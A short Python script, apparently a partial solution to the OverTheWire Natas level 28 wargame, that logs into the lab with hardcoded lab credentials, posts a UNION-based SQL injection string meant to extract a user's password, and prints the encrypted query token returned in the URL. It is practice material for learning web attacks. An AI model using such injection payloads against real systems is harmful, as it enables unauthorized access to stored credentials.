import requests
import binascii
import urllib
import base64
import string

charset = string.ascii_lowercase

url = "http://natas28.natas.labs.overthewire.org/index.php"
s = requests.Session()
s.auth = ('natas28', 'JWwR438wkgTsNKBbcJoowyysdM82YjeF')

sample = "' UNION select password from users where username='natas28 -- "

data = {'query':sample}
r = s.post(url, data=data)
cipher = r.url.split('=')[1]
# cipher = urllib.parse.unquote(cipher)
print("cipher | %s" % (cipher))